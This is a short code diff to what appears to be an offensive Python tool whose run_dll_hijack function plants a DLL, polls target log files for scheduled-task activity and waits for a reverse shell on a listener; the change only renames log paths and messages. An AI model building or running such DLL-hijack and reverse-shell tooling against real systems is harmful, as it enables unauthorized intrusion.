@@ -124,9 +124,11 @@ def _monitor_log_script(intel_path: str | None, drop_path: str) -> str:
     base = drop_path.rstrip("\\/")
     candidates.extend(
         [
-            f"{base}\\Logs\\monitor.log",
-            f"{base}\\logs\\monitor.log",
-            f"{base}\\monitor.log",
+            f"{base}\\Logs\\app.log",
+            f"{base}\\Logs\\service.log",
+            f"{base}\\Logs\\error.log",
+            f"{base}\\app.log",
+            f"{base}\\service.log",
         ]
     )
     seen: set[str] = set()
@@ -350,7 +352,7 @@ def run_dll_hijack(
                 if last_out and last_out != "no monitor log path":
                     lowered = last_out.lower()
                     if "error code: 126" not in lowered or deploy.run_as_user.lower() in lowered:
-                        print_info("monitor.log: task activity detected")
+                        print_info("service log: task activity detected")
             except Exception as exc:
                 print_warning(f"monitor poll: {exc}")
 
@@ -457,7 +459,7 @@ def run_dll_hijack(
         if not shell_connected and listener:
             print_warning(f"no reverse shell within {wait_seconds}s — task may need more time")
             if last_out:
-                print_info("monitor.log (last poll):")
+                print_info("service log (last poll):")
                 for line in last_out.splitlines()[-8:]:
                     print_info(f"  {line}")
 
